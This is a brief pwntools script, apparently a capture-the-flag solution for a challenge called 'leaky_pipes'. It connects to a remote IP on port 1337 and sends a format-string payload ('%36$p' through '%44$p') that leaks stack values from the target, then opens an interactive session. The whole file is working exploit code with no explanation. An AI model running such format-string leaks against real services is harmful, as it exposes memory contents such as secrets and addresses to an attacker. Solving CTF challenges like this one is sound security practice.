from pwn import *

# p = process('./leaky_pipes')
p = remote('34.125.199.248', 1337)

payload = b''.join(b'%' + str(i).encode() + b'$p' for i in range(36, 45))

p.sendlineafter(b'>> ', payload)
p.interactive()